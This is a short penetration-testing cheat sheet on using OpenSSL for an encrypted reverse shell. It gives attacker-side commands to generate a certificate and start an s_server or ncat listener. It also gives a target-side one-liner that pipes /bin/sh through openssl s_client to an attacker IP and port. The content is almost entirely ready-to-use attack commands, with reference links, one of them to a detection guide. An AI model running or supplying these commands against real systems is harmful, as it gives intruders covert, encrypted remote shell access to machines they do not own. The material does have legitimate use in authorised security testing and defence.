# OpenSSL

## 01 - Attacker

- Generate TLS certificate

```
user@pentestos:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

- Shell handler

```
user@pentestos:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port <PORT>

user@pentestos:~$ ncat --ssl [--ssl-key key.pem --ssl-cert cert.pem] -lp <PORT>
```

## 02 - Target

- Execute shell one-liner

```
$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
```

---
## References

- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)

- [Rio Asmara Suryadi: OpenSSL for Reverse Shell](https://rioasmara.com/2020/06/22/openssl-for-reverse-shell/)

- [Detecting and Investigating OpenSSL Backdoors on Linux](https://www.sandflysecurity.com/blog/detecting-and-investigating-openssl-backdoors-on-linux/)